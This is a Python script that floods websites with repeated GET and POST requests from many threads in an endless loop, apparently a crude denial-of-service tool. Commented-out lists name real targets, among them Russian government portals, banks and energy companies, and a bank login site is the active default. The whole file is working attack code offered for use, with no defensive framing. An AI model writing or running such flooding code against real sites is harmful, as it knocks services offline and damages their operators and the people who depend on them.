import logging
import time
import socket
import random
import sys
from main import logger
import requests
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

from threading import current_thread
import threading
from multiprocessing import Process





def get_request(url: str):
    """
    :param url: "https://google.com"
    :return:
    """
    try:
        res_get = requests.get(url, timeout=5)
        res_get_status = res_get.status_code
        logger.info(f'Site {url} has GET status {res_get_status} {current_thread().getName()}')
    except:
        logger.error(f'Site {url} has some problem with GET connection thread {current_thread().getName()}')
    try:
        requests.post(url)
    except:
        logger.error(f'Site {url} has some problem with POST connection')


def do_threads_second(url, n_thread):
    """

    :param url:
    :return:
    """
    while True:
        for i in range(n_thread):
            threading.Thread(target=get_request, args=(url,)).start()
        time.sleep(10)


def do_threads_first(list_url, n_thread):
    """

    :return:
    """
    for u in list_url:
        threading.Thread(target=do_threads_second, args=(u, n_thread)).start()



if __name__ == "__main__":
    logger.info('START PROGRAMMING')
    sys.argv.pop(0)
    if (url := sys.argv):
        url = url
    else:
        # url = ["https://gosuslugi1.ru/", "https://gosuslugi.ru/", "https://sber.ru", "https://lenta.ru/", "https://riafan.ru/", "https://savelife.pw/"]
        #        # "https://profile.sber.ru", "https://developers.sber.ru/portal/tools/api-sber"]
        # url = ["https://Lukoil.com", "https://Gazprom.ru", "https://Nlmk.com", "https://Tektorg.ru"
            # "https://Transneft.ru", "https://Tektorg.ru", "https://Rosneft.com", "https://Lukoil.com",
            #    "https://Gazprom.ru", "https://B2b.sibur.ru", "https://Onlinecontract.ru", "https://Eurochemgroup.com",
            #    "https://Uralchem.com",
            #    "https://Tatneft.ru",
            # "https://Nlmk.com",
            # "https://Acron.ru",
            # "https://www.gosuslugi.ru/", "https://www.gosuslugi.ru/api/opentracing",
            #    "https://ria.ru/", "http://ria.ru/"

        # url = ["https://esia.gosuslugi.ru", "https://ruspolitnews.ru/", "https://mer.govdnr.ru",
        #        "https://esia.gosuslugi.ru", "https://lukoil.com", "https://www.gazprom.ru", "https://nlmk.com",
        #        "https://tektorg.ru", "https://ruspolitnews.ru/"
        #     ]
        url = ["http://enter.unicredit.ru"]
    Process(target=do_threads_first, args=(url, 50)).start()
